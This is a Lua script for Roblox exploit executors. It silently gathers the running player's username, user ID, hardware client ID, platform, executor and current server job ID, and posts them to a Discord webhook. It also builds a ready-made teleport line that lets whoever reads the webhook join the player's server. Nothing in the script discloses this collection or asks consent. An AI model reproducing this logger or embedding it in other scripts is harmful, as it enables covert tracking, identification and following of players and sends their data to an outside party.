local Ikura = game:GetService("CoreGui")
local folderName = "JustAScript"

local folder = Instance.new("Folder")
folder.Name = folderName

if Ikura:FindFirstChild(folderName) then   
else
    folder.Parent = Ikura
    local request= http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "💻" or "📱"
    local exe = identifyexecutor() 
    local player = game.Players.LocalPlayer
    local job = tostring(game.JobId)
    local gameId = game.PlaceId
    local plyID = player.UserId
    local teleportStatement = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameId .. ", '" .. job .. "', player)"
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

    local currentTime = os.date("%Y-%m-%d %H:%M:%S") 

    local response = request({
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "",
            embeds = {
                {
                    title = Title,
                    description = "",
                    type = "rich",
                    color = Color,
                    thumbnail = {
                        url = ThumbnailUrl
                    },
                    fields = {              
                        {
                            name = "Information:",
                            value = " Player:\n〘👤〙**Username**: [" .. player.Name .. "](https://www.roblox.com/users/" .. player.UserId .. "/profile)\n〘🎲〙**Player ID:** " .. plyID .. "\n\Games:\n〘🎮〙**Game**: [" .. gameName .. "](https://www.roblox.com/games/" .. gameId .. ")\n〘🎲〙Game ID: " .. gameId .. "\n\n Misc:\n〘🔧〙**Executor**: " .. exe .. "\n **〘❓〙Platform**: " .. deviceType .."\n **〘👤〙HWID**:\n"..hwid.." \n\n Execution Time 🕧\n ".. currentTime,
                            inline = true
                        },
                        {
                            name = FieldTitle,
                            value = FieldText,
                            inline = true
                        },
                        {
                            name = "Join Script",
                            value = "```lua\n" .. teleportStatement .. "```",
                            inline = true
                        }
                    },
                    footer = {
                        text = FooterText,
                        icon_url = FooterUrl
                    }
                }
            }
        })
    })    
end
